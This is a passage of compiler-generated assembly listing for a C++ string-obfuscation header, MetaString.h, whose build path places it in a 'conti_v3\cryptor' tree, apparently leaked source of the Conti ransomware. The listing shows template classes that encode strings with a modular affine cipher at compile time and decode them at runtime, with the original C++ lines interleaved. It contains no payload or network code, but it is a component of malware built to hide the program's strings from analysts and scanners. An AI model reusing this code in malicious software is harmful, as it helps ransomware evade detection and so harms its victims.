  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 52	 sub	 eax, 82			; 00000052H
  0002d	6b c0 13	 imul	 eax, eax, 19
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 6b	 imul	 eax, eax, 107		; 0000006bH
  0002d	83 c0 52	 add	 eax, 82			; 00000052H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
